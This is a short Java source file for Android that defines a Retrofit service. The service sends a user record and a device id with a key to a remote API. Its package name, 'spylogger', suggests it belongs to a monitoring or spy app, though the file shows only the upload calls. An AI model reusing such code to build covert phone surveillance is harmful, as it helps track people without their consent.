package com.gravatasufoca.spylogger.services;

import android.content.Context;

import com.gravatasufoca.spylogger.helpers.TaskComplete;
import com.gravatasufoca.spylogger.vos.UsuarioVO;

import retrofit2.Call;

/**
 * Created by bruno on 02/12/16.
 */

public class SendUsuarioService extends SendDataService<UsuarioVO> {

    public SendUsuarioService(Context context,TaskComplete handler) {
        super(context,handler);
    }

    public void inserirUsuario(UsuarioVO usuarioVO){
        Call<UsuarioVO> call=sendApi.inserirUsuario(usuarioVO);
        call.enqueue(this);
    }

    public void inserirChave(Integer idAparelho, String chave){
        Call<UsuarioVO> call=sendApi.inserirChave(idAparelho,chave);
        call.enqueue(this);
    }

}
